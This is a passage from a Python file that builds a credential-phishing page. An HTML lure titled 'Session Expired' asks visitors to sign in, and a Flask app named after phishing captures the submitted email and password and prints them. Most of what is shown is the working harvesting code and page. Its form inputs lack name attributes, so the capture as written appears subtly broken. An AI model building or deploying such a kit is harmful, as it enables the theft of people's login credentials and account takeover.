            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .message {
            color: red;
            margin-top: 10px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Session Expired</h2>
        <form action="/submit" method="post">
            <div class="form">
                <input type="email" placeholder="Email" required>
                <input type="password" placeholder="Password" required>
                <button type="submit">Sign In</button>
            </div>
            <div class="message">* If you didn't expect this email, please disregard and ignore the link.</div>
        </form>
    </div>
</body>
</html>
"""

# Create the Flask app
app = Flask(__name__, static_folder='../templates')

@app.route('/')
def home():
    return render_template('phishing.html')

@app.route('/submit', methods=['POST'])
def capture_data():
    email = request.form.get('email')
    password = request.form.get('password')
    print(f"Captured: Email: {email}, Password: {password}")
    return "Thank you for your input!"

# Run the Flask app
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

# Simple SMTP configuration for local testing
